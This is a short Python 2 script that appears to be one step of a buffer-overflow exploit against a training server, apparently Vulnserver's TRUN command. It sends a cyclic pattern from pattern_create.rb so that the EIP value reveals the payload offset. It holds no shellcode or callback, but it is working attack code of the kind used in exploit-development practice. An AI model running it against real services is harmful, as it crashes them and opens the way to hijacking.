#!/usr/bin/env python2

'''
Sends a pattern of unique bytes from pattern_create.rb, which, when you examine the EIP register value, will tell you
the offset for a payload position.
'''

import socket

from options import HOST, PORT

with open('pattern_create_3200.dat', 'r') as f:
    offset = f.readline()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
cmd = ('TRUN /.:/' + offset)

# print("SEND "+cmd)
s.send(cmd)
print("sent %d bytes" % len(cmd))
s.close()
